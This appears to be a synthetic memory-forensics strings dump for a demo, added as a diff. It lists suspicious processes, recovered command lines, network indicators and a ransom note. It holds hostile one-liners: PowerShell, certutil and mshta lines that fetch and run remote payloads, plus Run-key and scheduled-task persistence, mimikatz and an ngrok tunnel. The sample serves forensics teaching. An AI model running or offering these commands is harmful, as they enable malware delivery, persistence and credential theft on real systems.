@@ -1,0 +1,37 @@
+Volatility-style strings export (synthetic, for demo) — artifact you own.
+======================================================================
+System uptime 4:12:07, page file C:\pagefile.sys, hostname WIN-DESKTOP-07.
+
+[process list snapshot]
+System
+smss.exe
+csrss.exe
+explorer.exe
+chrome.exe
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
+rundll32.exe
+mshta.exe http://malicious-c2.top/payload.hta
+mimikatz.exe
+C:\Users\Public\AppData\Local\Temp\update.exe
+
+[recovered command lines]
+powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')
+certutil.exe -urlcache -split -f http://203.0.113.66/beacon.exe svchost.exe
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\Temp\run.bat
+schtasks /create /tn "WindowsUpdate" /tr C:\ProgramData\svc.exe /sc onlogon
+[FromBase64String] decode buffer @ 0x7ffe0030
+VirtualAlloc + WriteProcessMemory + CreateRemoteThread observed in chrome.exe handle table
+
+[network artifacts]
+connected 10.0.0.14:49233 -> 185.220.101.47:443
+dns query api.evil-domain.xyz
+dns query updates.microsoft.com
+beacon callback https://cdn.legit-looking.io/jquery.min.js
+internal proxy 192.168.68.10:3128
+
+[misc strings]
+contact: operator@protonmail-relay.ru
+ransom wallet: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq
+All your files have been encrypted. Decrypt your files by paying in bitcoin.
+ngrok.exe http 4444
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
